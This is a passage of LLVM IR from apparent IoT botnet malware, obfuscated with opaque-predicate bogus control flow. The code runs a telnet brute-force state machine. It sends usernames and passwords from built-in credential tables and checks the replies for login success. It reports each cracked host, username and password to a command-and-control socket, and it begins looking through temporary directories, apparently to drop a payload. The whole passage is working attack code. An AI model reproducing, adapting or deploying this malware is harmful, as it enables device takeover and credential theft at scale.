originalBBpart281:                                ; preds = %originalBB79
  br i1 %467, label %476, label %480

; <label>:476:                                    ; preds = %originalBBpart281
  %477 = load i32, i32* %6, align 4
  %478 = sext i32 %477 to i64
  %479 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %478
  call void @reset_telstate(%struct.telstate_t* %479)
  br label %1394

; <label>:480:                                    ; preds = %originalBBpart281
  br label %481

; <label>:481:                                    ; preds = %480
  %482 = load i32, i32* %6, align 4
  %483 = sext i32 %482 to i64
  %484 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %483
  %485 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %484, i32 0, i32 7
  %486 = load i32, i32* %485, align 16
  %487 = add i32 %486, 7
  %488 = zext i32 %487 to i64
  %489 = call i64 @time(i64* null) #5
  %490 = icmp slt i64 %488, %489
  br i1 %490, label %491, label %495

; <label>:491:                                    ; preds = %481
  %492 = load i32, i32* %6, align 4
  %493 = sext i32 %492 to i64
  %494 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %493
  call void @reset_telstate(%struct.telstate_t* %494)
  br label %495

; <label>:495:                                    ; preds = %491, %481
  br label %1377

; <label>:496:                                    ; preds = %154
  %497 = load i32, i32* %6, align 4
  %498 = sext i32 %497 to i64
  %499 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %498
  %500 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %499, i32 0, i32 0
  %501 = load i32, i32* %500, align 16
  %502 = load i32, i32* %3, align 4
  %503 = load i32, i32* %6, align 4
  %504 = sext i32 %503 to i64
  %505 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %504
  %506 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %505, i32 0, i32 9
  %507 = load i8*, i8** %506, align 8
  %508 = call i32 @read_until_response(i32 %501, i32 %502, i8* %507, i32 1024, i8** getelementptr inbounds ([16 x i8*], [16 x i8*]* @advances, i32 0, i32 0))
  %509 = icmp ne i32 %508, 0
  br i1 %509, label %510, label %565

; <label>:510:                                    ; preds = %496
  %511 = call i64 @time(i64* null) #5
  %512 = trunc i64 %511 to i32
  %513 = load i32, i32* %6, align 4
  %514 = sext i32 %513 to i64
  %515 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %514
  %516 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %515, i32 0, i32 7
  store i32 %512, i32* %516, align 16
  %517 = load i32, i32* %6, align 4
  %518 = sext i32 %517 to i64
  %519 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %518
  %520 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %519, i32 0, i32 9
  %521 = load i8*, i8** %520, align 8
  %522 = call i32 @contains_fail(i8* %521)
  %523 = icmp ne i32 %522, 0
  br i1 %523, label %524, label %544

; <label>:524:                                    ; preds = %510
  %525 = load i32, i32* @x.71
  %526 = load i32, i32* @y.72
  %527 = sub i32 %525, 1
  %528 = mul i32 %525, %527
  %529 = urem i32 %528, 2
  %530 = icmp eq i32 %529, 0
  %531 = icmp slt i32 %526, 10
  %532 = or i1 %530, %531
  br i1 %532, label %originalBB83, label %originalBB83alteredBB

originalBB83:                                     ; preds = %originalBB83alteredBB, %524
  %533 = load i32, i32* %6, align 4
  %534 = sext i32 %533 to i64
  %535 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %534
  call void @advance_telstate(%struct.telstate_t* %535, i32 0)
  %536 = load i32, i32* @x.71
  %537 = load i32, i32* @y.72
  %538 = sub i32 %536, 1
  %539 = mul i32 %536, %538
  %540 = urem i32 %539, 2
  %541 = icmp eq i32 %540, 0
  %542 = icmp slt i32 %537, 10
  %543 = or i1 %541, %542
  br i1 %543, label %originalBBpart285, label %originalBB83alteredBB

originalBBpart285:                                ; preds = %originalBB83
  br label %548

; <label>:544:                                    ; preds = %510
  %545 = load i32, i32* %6, align 4
  %546 = sext i32 %545 to i64
  %547 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %546
  call void @advance_telstate(%struct.telstate_t* %547, i32 3)
  br label %548

; <label>:548:                                    ; preds = %544, %originalBBpart285
  %549 = load i32, i32* @x.71
  %550 = load i32, i32* @y.72
  %551 = sub i32 %549, 1
  %552 = mul i32 %549, %551
  %553 = urem i32 %552, 2
  %554 = icmp eq i32 %553, 0
  %555 = icmp slt i32 %550, 10
  %556 = or i1 %554, %555
  br i1 %556, label %originalBB87, label %originalBB87alteredBB

originalBB87:                                     ; preds = %originalBB87alteredBB, %548
  %557 = load i32, i32* @x.71
  %558 = load i32, i32* @y.72
  %559 = sub i32 %557, 1
  %560 = mul i32 %557, %559
  %561 = urem i32 %560, 2
  %562 = icmp eq i32 %561, 0
  %563 = icmp slt i32 %558, 10
  %564 = or i1 %562, %563
  br i1 %564, label %originalBBpart289, label %originalBB87alteredBB

originalBBpart289:                                ; preds = %originalBB87
  br label %1394

; <label>:565:                                    ; preds = %496
  %566 = load i32, i32* %6, align 4
  %567 = sext i32 %566 to i64
  %568 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %567
  %569 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %568, i32 0, i32 7
  %570 = load i32, i32* %569, align 16
  %571 = add i32 %570, 7
  %572 = zext i32 %571 to i64
  %573 = call i64 @time(i64* null) #5
  %574 = icmp slt i64 %572, %573
  br i1 %574, label %575, label %579

; <label>:575:                                    ; preds = %565
  %576 = load i32, i32* %6, align 4
  %577 = sext i32 %576 to i64
  %578 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %577
  call void @reset_telstate(%struct.telstate_t* %578)
  br label %579

; <label>:579:                                    ; preds = %575, %565
  br label %1377

; <label>:580:                                    ; preds = %154
  %581 = load i32, i32* %6, align 4
  %582 = sext i32 %581 to i64
  %583 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %582
  %584 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %583, i32 0, i32 0
  %585 = load i32, i32* %584, align 16
  %586 = load i32, i32* %6, align 4
  %587 = sext i32 %586 to i64
  %588 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %587
  %589 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %588, i32 0, i32 4
  %590 = load i8, i8* %589, align 2
  %591 = zext i8 %590 to i64
  %592 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Usernames, i64 0, i64 %591
  %593 = load i8*, i8** %592, align 8
  %594 = load i32, i32* %6, align 4
  %595 = sext i32 %594 to i64
  %596 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %595
  %597 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %596, i32 0, i32 4
  %598 = load i8, i8* %597, align 2
  %599 = zext i8 %598 to i64
  %600 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Usernames, i64 0, i64 %599
  %601 = load i8*, i8** %600, align 8
  %602 = call i64 @strlen(i8* %601) #9
  %603 = call i64 @send(i32 %585, i8* %593, i64 %602, i32 16384)
  %604 = icmp slt i64 %603, 0
  br i1 %604, label %605, label %609

; <label>:605:                                    ; preds = %580
  %606 = load i32, i32* %6, align 4
  %607 = sext i32 %606 to i64
  %608 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %607
  call void @reset_telstate(%struct.telstate_t* %608)
  br label %1394

; <label>:609:                                    ; preds = %580
  %610 = load i32, i32* @x.71
  %611 = load i32, i32* @y.72
  %612 = sub i32 %610, 1
  %613 = mul i32 %610, %612
  %614 = urem i32 %613, 2
  %615 = icmp eq i32 %614, 0
  %616 = icmp slt i32 %611, 10
  %617 = or i1 %615, %616
  br i1 %617, label %originalBB91, label %originalBB91alteredBB

originalBB91:                                     ; preds = %originalBB91alteredBB, %609
  %618 = load i32, i32* %6, align 4
  %619 = sext i32 %618 to i64
  %620 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %619
  %621 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %620, i32 0, i32 0
  %622 = load i32, i32* %621, align 16
  %623 = call i64 @send(i32 %622, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.501, i32 0, i32 0), i64 2, i32 16384)
  %624 = icmp slt i64 %623, 0
  %625 = load i32, i32* @x.71
  %626 = load i32, i32* @y.72
  %627 = sub i32 %625, 1
  %628 = mul i32 %625, %627
  %629 = urem i32 %628, 2
  %630 = icmp eq i32 %629, 0
  %631 = icmp slt i32 %626, 10
  %632 = or i1 %630, %631
  br i1 %632, label %originalBBpart293, label %originalBB91alteredBB

originalBBpart293:                                ; preds = %originalBB91
  br i1 %624, label %633, label %653

; <label>:633:                                    ; preds = %originalBBpart293
  %634 = load i32, i32* @x.71
  %635 = load i32, i32* @y.72
  %636 = sub i32 %634, 1
  %637 = mul i32 %634, %636
  %638 = urem i32 %637, 2
  %639 = icmp eq i32 %638, 0
  %640 = icmp slt i32 %635, 10
  %641 = or i1 %639, %640
  br i1 %641, label %originalBB95, label %originalBB95alteredBB

originalBB95:                                     ; preds = %originalBB95alteredBB, %633
  %642 = load i32, i32* %6, align 4
  %643 = sext i32 %642 to i64
  %644 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %643
  call void @reset_telstate(%struct.telstate_t* %644)
  %645 = load i32, i32* @x.71
  %646 = load i32, i32* @y.72
  %647 = sub i32 %645, 1
  %648 = mul i32 %645, %647
  %649 = urem i32 %648, 2
  %650 = icmp eq i32 %649, 0
  %651 = icmp slt i32 %646, 10
  %652 = or i1 %650, %651
  br i1 %652, label %originalBBpart297, label %originalBB95alteredBB

originalBBpart297:                                ; preds = %originalBB95
  br label %1394

; <label>:653:                                    ; preds = %originalBBpart293
  %654 = load i32, i32* %6, align 4
  %655 = sext i32 %654 to i64
  %656 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %655
  call void @advance_telstate(%struct.telstate_t* %656, i32 4)
  br label %1377

; <label>:657:                                    ; preds = %154
  %658 = load i32, i32* %6, align 4
  %659 = sext i32 %658 to i64
  %660 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %659
  %661 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %660, i32 0, i32 0
  %662 = load i32, i32* %661, align 16
  %663 = load i32, i32* %3, align 4
  %664 = load i32, i32* %6, align 4
  %665 = sext i32 %664 to i64
  %666 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %665
  %667 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %666, i32 0, i32 9
  %668 = load i8*, i8** %667, align 8
  %669 = call i32 @read_until_response(i32 %662, i32 %663, i8* %668, i32 1024, i8** getelementptr inbounds ([16 x i8*], [16 x i8*]* @advances, i32 0, i32 0))
  %670 = icmp ne i32 %669, 0
  br i1 %670, label %671, label %694

; <label>:671:                                    ; preds = %657
  %672 = call i64 @time(i64* null) #5
  %673 = trunc i64 %672 to i32
  %674 = load i32, i32* %6, align 4
  %675 = sext i32 %674 to i64
  %676 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %675
  %677 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %676, i32 0, i32 7
  store i32 %673, i32* %677, align 16
  %678 = load i32, i32* %6, align 4
  %679 = sext i32 %678 to i64
  %680 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %679
  %681 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %680, i32 0, i32 9
  %682 = load i8*, i8** %681, align 8
  %683 = call i32 @contains_fail(i8* %682)
  %684 = icmp ne i32 %683, 0
  br i1 %684, label %685, label %689

; <label>:685:                                    ; preds = %671
  %686 = load i32, i32* %6, align 4
  %687 = sext i32 %686 to i64
  %688 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %687
  call void @advance_telstate(%struct.telstate_t* %688, i32 0)
  br label %693

; <label>:689:                                    ; preds = %671
  %690 = load i32, i32* %6, align 4
  %691 = sext i32 %690 to i64
  %692 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %691
  call void @advance_telstate(%struct.telstate_t* %692, i32 5)
  br label %693

; <label>:693:                                    ; preds = %689, %685
  br label %1394

; <label>:694:                                    ; preds = %657
  %695 = load i32, i32* %6, align 4
  %696 = sext i32 %695 to i64
  %697 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %696
  %698 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %697, i32 0, i32 7
  %699 = load i32, i32* %698, align 16
  %700 = add i32 %699, 7
  %701 = zext i32 %700 to i64
  %702 = call i64 @time(i64* null) #5
  %703 = icmp slt i64 %701, %702
  br i1 %703, label %704, label %724

; <label>:704:                                    ; preds = %694
  %705 = load i32, i32* @x.71
  %706 = load i32, i32* @y.72
  %707 = sub i32 %705, 1
  %708 = mul i32 %705, %707
  %709 = urem i32 %708, 2
  %710 = icmp eq i32 %709, 0
  %711 = icmp slt i32 %706, 10
  %712 = or i1 %710, %711
  br i1 %712, label %originalBB99, label %originalBB99alteredBB

originalBB99:                                     ; preds = %originalBB99alteredBB, %704
  %713 = load i32, i32* %6, align 4
  %714 = sext i32 %713 to i64
  %715 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %714
  call void @reset_telstate(%struct.telstate_t* %715)
  %716 = load i32, i32* @x.71
  %717 = load i32, i32* @y.72
  %718 = sub i32 %716, 1
  %719 = mul i32 %716, %718
  %720 = urem i32 %719, 2
  %721 = icmp eq i32 %720, 0
  %722 = icmp slt i32 %717, 10
  %723 = or i1 %721, %722
  br i1 %723, label %originalBBpart2101, label %originalBB99alteredBB

originalBBpart2101:                               ; preds = %originalBB99
  br label %724

; <label>:724:                                    ; preds = %originalBBpart2101, %694
  br label %1377

; <label>:725:                                    ; preds = %154
  %726 = load i32, i32* %6, align 4
  %727 = sext i32 %726 to i64
  %728 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %727
  %729 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %728, i32 0, i32 0
  %730 = load i32, i32* %729, align 16
  %731 = load i32, i32* %6, align 4
  %732 = sext i32 %731 to i64
  %733 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %732
  %734 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %733, i32 0, i32 5
  %735 = load i8, i8* %734, align 1
  %736 = zext i8 %735 to i64
  %737 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Passwords, i64 0, i64 %736
  %738 = load i8*, i8** %737, align 8
  %739 = load i32, i32* %6, align 4
  %740 = sext i32 %739 to i64
  %741 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %740
  %742 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %741, i32 0, i32 5
  %743 = load i8, i8* %742, align 1
  %744 = zext i8 %743 to i64
  %745 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Passwords, i64 0, i64 %744
  %746 = load i8*, i8** %745, align 8
  %747 = call i64 @strlen(i8* %746) #9
  %748 = call i64 @send(i32 %730, i8* %738, i64 %747, i32 16384)
  %749 = icmp slt i64 %748, 0
  br i1 %749, label %750, label %770

; <label>:750:                                    ; preds = %725
  %751 = load i32, i32* @x.71
  %752 = load i32, i32* @y.72
  %753 = sub i32 %751, 1
  %754 = mul i32 %751, %753
  %755 = urem i32 %754, 2
  %756 = icmp eq i32 %755, 0
  %757 = icmp slt i32 %752, 10
  %758 = or i1 %756, %757
  br i1 %758, label %originalBB103, label %originalBB103alteredBB

originalBB103:                                    ; preds = %originalBB103alteredBB, %750
  %759 = load i32, i32* %6, align 4
  %760 = sext i32 %759 to i64
  %761 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %760
  call void @reset_telstate(%struct.telstate_t* %761)
  %762 = load i32, i32* @x.71
  %763 = load i32, i32* @y.72
  %764 = sub i32 %762, 1
  %765 = mul i32 %762, %764
  %766 = urem i32 %765, 2
  %767 = icmp eq i32 %766, 0
  %768 = icmp slt i32 %763, 10
  %769 = or i1 %767, %768
  br i1 %769, label %originalBBpart2105, label %originalBB103alteredBB

originalBBpart2105:                               ; preds = %originalBB103
  br label %1394

; <label>:770:                                    ; preds = %725
  %771 = load i32, i32* %6, align 4
  %772 = sext i32 %771 to i64
  %773 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %772
  %774 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %773, i32 0, i32 0
  %775 = load i32, i32* %774, align 16
  %776 = call i64 @send(i32 %775, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.501, i32 0, i32 0), i64 2, i32 16384)
  %777 = icmp slt i64 %776, 0
  br i1 %777, label %778, label %798

; <label>:778:                                    ; preds = %770
  %779 = load i32, i32* @x.71
  %780 = load i32, i32* @y.72
  %781 = sub i32 %779, 1
  %782 = mul i32 %779, %781
  %783 = urem i32 %782, 2
  %784 = icmp eq i32 %783, 0
  %785 = icmp slt i32 %780, 10
  %786 = or i1 %784, %785
  br i1 %786, label %originalBB107, label %originalBB107alteredBB

originalBB107:                                    ; preds = %originalBB107alteredBB, %778
  %787 = load i32, i32* %6, align 4
  %788 = sext i32 %787 to i64
  %789 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %788
  call void @reset_telstate(%struct.telstate_t* %789)
  %790 = load i32, i32* @x.71
  %791 = load i32, i32* @y.72
  %792 = sub i32 %790, 1
  %793 = mul i32 %790, %792
  %794 = urem i32 %793, 2
  %795 = icmp eq i32 %794, 0
  %796 = icmp slt i32 %791, 10
  %797 = or i1 %795, %796
  br i1 %797, label %originalBBpart2109, label %originalBB107alteredBB

originalBBpart2109:                               ; preds = %originalBB107
  br label %1394

; <label>:798:                                    ; preds = %770
  %799 = load i32, i32* %6, align 4
  %800 = sext i32 %799 to i64
  %801 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %800
  call void @advance_telstate(%struct.telstate_t* %801, i32 6)
  br label %1377

; <label>:802:                                    ; preds = %154
  %803 = load i32, i32* %6, align 4
  %804 = sext i32 %803 to i64
  %805 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %804
  %806 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %805, i32 0, i32 0
  %807 = load i32, i32* %806, align 16
  %808 = load i32, i32* %3, align 4
  %809 = load i32, i32* %6, align 4
  %810 = sext i32 %809 to i64
  %811 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %810
  %812 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %811, i32 0, i32 9
  %813 = load i8*, i8** %812, align 8
  %814 = call i32 @read_until_response(i32 %807, i32 %808, i8* %813, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %815 = icmp ne i32 %814, 0
  br i1 %815, label %816, label %967

; <label>:816:                                    ; preds = %802
  %817 = call i64 @time(i64* null) #5
  %818 = trunc i64 %817 to i32
  %819 = load i32, i32* %6, align 4
  %820 = sext i32 %819 to i64
  %821 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %820
  %822 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %821, i32 0, i32 7
  store i32 %818, i32* %822, align 16
  %823 = load i32, i32* %6, align 4
  %824 = sext i32 %823 to i64
  %825 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %824
  %826 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %825, i32 0, i32 9
  %827 = load i8*, i8** %826, align 8
  %828 = call i32 @contains_fail(i8* %827)
  %829 = icmp ne i32 %828, 0
  br i1 %829, label %830, label %850

; <label>:830:                                    ; preds = %816
  %831 = load i32, i32* @x.71
  %832 = load i32, i32* @y.72
  %833 = sub i32 %831, 1
  %834 = mul i32 %831, %833
  %835 = urem i32 %834, 2
  %836 = icmp eq i32 %835, 0
  %837 = icmp slt i32 %832, 10
  %838 = or i1 %836, %837
  br i1 %838, label %originalBB111, label %originalBB111alteredBB

originalBB111:                                    ; preds = %originalBB111alteredBB, %830
  %839 = load i32, i32* %6, align 4
  %840 = sext i32 %839 to i64
  %841 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %840
  call void @advance_telstate(%struct.telstate_t* %841, i32 0)
  %842 = load i32, i32* @x.71
  %843 = load i32, i32* @y.72
  %844 = sub i32 %842, 1
  %845 = mul i32 %842, %844
  %846 = urem i32 %845, 2
  %847 = icmp eq i32 %846, 0
  %848 = icmp slt i32 %843, 10
  %849 = or i1 %847, %848
  br i1 %849, label %originalBBpart2113, label %originalBB111alteredBB

originalBBpart2113:                               ; preds = %originalBB111
  br label %966

; <label>:850:                                    ; preds = %816
  %851 = load i32, i32* %6, align 4
  %852 = sext i32 %851 to i64
  %853 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %852
  %854 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %853, i32 0, i32 9
  %855 = load i8*, i8** %854, align 8
  %856 = call i32 @contains_success(i8* %855)
  %857 = icmp ne i32 %856, 0
  br i1 %857, label %858, label %929

; <label>:858:                                    ; preds = %850
  %859 = load i32, i32* @x.71
  %860 = load i32, i32* @y.72
  %861 = sub i32 %859, 1
  %862 = mul i32 %859, %861
  %863 = urem i32 %862, 2
  %864 = icmp eq i32 %863, 0
  %865 = icmp slt i32 %860, 10
  %866 = or i1 %864, %865
  br i1 %866, label %originalBB115, label %originalBB115alteredBB

originalBB115:                                    ; preds = %originalBB115alteredBB, %858
  %867 = load i32, i32* %6, align 4
  %868 = sext i32 %867 to i64
  %869 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %868
  %870 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %869, i32 0, i32 3
  %871 = load i8, i8* %870, align 1
  %872 = zext i8 %871 to i32
  %873 = icmp eq i32 %872, 2
  %874 = load i32, i32* @x.71
  %875 = load i32, i32* @y.72
  %876 = sub i32 %874, 1
  %877 = mul i32 %874, %876
  %878 = urem i32 %877, 2
  %879 = icmp eq i32 %878, 0
  %880 = icmp slt i32 %875, 10
  %881 = or i1 %879, %880
  br i1 %881, label %originalBBpart2117, label %originalBB115alteredBB

originalBBpart2117:                               ; preds = %originalBB115
  br i1 %873, label %882, label %886

; <label>:882:                                    ; preds = %originalBBpart2117
  %883 = load i32, i32* %6, align 4
  %884 = sext i32 %883 to i64
  %885 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %884
  call void @advance_telstate(%struct.telstate_t* %885, i32 7)
  br label %912

; <label>:886:                                    ; preds = %originalBBpart2117
  %887 = load i32, i32* @mainCommSock, align 4
  %888 = load i32, i32* %6, align 4
  %889 = sext i32 %888 to i64
  %890 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %889
  %891 = call i8* @get_telstate_host(%struct.telstate_t* %890)
  %892 = load i32, i32* %6, align 4
  %893 = sext i32 %892 to i64
  %894 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %893
  %895 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %894, i32 0, i32 4
  %896 = load i8, i8* %895, align 2
  %897 = zext i8 %896 to i64
  %898 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Usernames, i64 0, i64 %897
  %899 = load i8*, i8** %898, align 8
  %900 = load i32, i32* %6, align 4
  %901 = sext i32 %900 to i64
  %902 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %901
  %903 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %902, i32 0, i32 5
  %904 = load i8, i8* %903, align 1
  %905 = zext i8 %904 to i64
  %906 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Passwords, i64 0, i64 %905
  %907 = load i8*, i8** %906, align 8
  %908 = call i32 (i32, i8*, ...) @sockprintf(i32 %887, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.502, i32 0, i32 0), i8* %891, i8* %899, i8* %907)
  %909 = load i32, i32* %6, align 4
  %910 = sext i32 %909 to i64
  %911 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %910
  call void @advance_telstate(%struct.telstate_t* %911, i32 7)
  br label %912

; <label>:912:                                    ; preds = %886, %882
  %913 = load i32, i32* @x.71
  %914 = load i32, i32* @y.72
  %915 = sub i32 %913, 1
  %916 = mul i32 %913, %915
  %917 = urem i32 %916, 2
  %918 = icmp eq i32 %917, 0
  %919 = icmp slt i32 %914, 10
  %920 = or i1 %918, %919
  br i1 %920, label %originalBB119, label %originalBB119alteredBB

originalBB119:                                    ; preds = %originalBB119alteredBB, %912
  %921 = load i32, i32* @x.71
  %922 = load i32, i32* @y.72
  %923 = sub i32 %921, 1
  %924 = mul i32 %921, %923
  %925 = urem i32 %924, 2
  %926 = icmp eq i32 %925, 0
  %927 = icmp slt i32 %922, 10
  %928 = or i1 %926, %927
  br i1 %928, label %originalBBpart2121, label %originalBB119alteredBB

originalBBpart2121:                               ; preds = %originalBB119
  br label %949

; <label>:929:                                    ; preds = %850
  %930 = load i32, i32* @x.71
  %931 = load i32, i32* @y.72
  %932 = sub i32 %930, 1
  %933 = mul i32 %930, %932
  %934 = urem i32 %933, 2
  %935 = icmp eq i32 %934, 0
  %936 = icmp slt i32 %931, 10
  %937 = or i1 %935, %936
  br i1 %937, label %originalBB123, label %originalBB123alteredBB

originalBB123:                                    ; preds = %originalBB123alteredBB, %929
  %938 = load i32, i32* %6, align 4
  %939 = sext i32 %938 to i64
  %940 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %939
  call void @reset_telstate(%struct.telstate_t* %940)
  %941 = load i32, i32* @x.71
  %942 = load i32, i32* @y.72
  %943 = sub i32 %941, 1
  %944 = mul i32 %941, %943
  %945 = urem i32 %944, 2
  %946 = icmp eq i32 %945, 0
  %947 = icmp slt i32 %942, 10
  %948 = or i1 %946, %947
  br i1 %948, label %originalBBpart2125, label %originalBB123alteredBB

originalBBpart2125:                               ; preds = %originalBB123
  br label %949

; <label>:949:                                    ; preds = %originalBBpart2125, %originalBBpart2121
  %950 = load i32, i32* @x.71
  %951 = load i32, i32* @y.72
  %952 = sub i32 %950, 1
  %953 = mul i32 %950, %952
  %954 = urem i32 %953, 2
  %955 = icmp eq i32 %954, 0
  %956 = icmp slt i32 %951, 10
  %957 = or i1 %955, %956
  br i1 %957, label %originalBB127, label %originalBB127alteredBB

originalBB127:                                    ; preds = %originalBB127alteredBB, %949
  %958 = load i32, i32* @x.71
  %959 = load i32, i32* @y.72
  %960 = sub i32 %958, 1
  %961 = mul i32 %958, %960
  %962 = urem i32 %961, 2
  %963 = icmp eq i32 %962, 0
  %964 = icmp slt i32 %959, 10
  %965 = or i1 %963, %964
  br i1 %965, label %originalBBpart2129, label %originalBB127alteredBB

originalBBpart2129:                               ; preds = %originalBB127
  br label %966

; <label>:966:                                    ; preds = %originalBBpart2129, %originalBBpart2113
  br label %1394

; <label>:967:                                    ; preds = %802
  %968 = load i32, i32* @x.71
  %969 = load i32, i32* @y.72
  %970 = sub i32 %968, 1
  %971 = mul i32 %968, %970
  %972 = urem i32 %971, 2
  %973 = icmp eq i32 %972, 0
  %974 = icmp slt i32 %969, 10
  %975 = or i1 %973, %974
  br i1 %975, label %originalBB131, label %originalBB131alteredBB

originalBB131:                                    ; preds = %originalBB131alteredBB, %967
  %976 = load i32, i32* %6, align 4
  %977 = sext i32 %976 to i64
  %978 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %977
  %979 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %978, i32 0, i32 7
  %980 = load i32, i32* %979, align 16
  %981 = add i32 %980, 7
  %982 = zext i32 %981 to i64
  %983 = call i64 @time(i64* null) #5
  %984 = icmp slt i64 %982, %983
  %985 = load i32, i32* @x.71
  %986 = load i32, i32* @y.72
  %987 = sub i32 %985, 1
  %988 = mul i32 %985, %987
  %989 = urem i32 %988, 2
  %990 = icmp eq i32 %989, 0
  %991 = icmp slt i32 %986, 10
  %992 = or i1 %990, %991
  br i1 %992, label %originalBBpart2136, label %originalBB131alteredBB

originalBBpart2136:                               ; preds = %originalBB131
  br i1 %984, label %993, label %997

; <label>:993:                                    ; preds = %originalBBpart2136
  %994 = load i32, i32* %6, align 4
  %995 = sext i32 %994 to i64
  %996 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %995
  call void @reset_telstate(%struct.telstate_t* %996)
  br label %997

; <label>:997:                                    ; preds = %993, %originalBBpart2136
  br label %1377

; <label>:998:                                    ; preds = %154
  %999 = load i32, i32* @x.71
  %1000 = load i32, i32* @y.72
  %1001 = sub i32 %999, 1
  %1002 = mul i32 %999, %1001
  %1003 = urem i32 %1002, 2
  %1004 = icmp eq i32 %1003, 0
  %1005 = icmp slt i32 %1000, 10
  %1006 = or i1 %1004, %1005
  br i1 %1006, label %originalBB138, label %originalBB138alteredBB

originalBB138:                                    ; preds = %originalBB138alteredBB, %998
  %1007 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %1008 = call i32 (i8*, i8*, ...) @sprintf(i8* %1007, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.503, i32 0, i32 0), i8** getelementptr inbounds ([13 x i8*], [13 x i8*]* @Temp_Directorys, i32 0, i32 0)) #5
  %1009 = load i32, i32* %6, align 4
  %1010 = sext i32 %1009 to i64
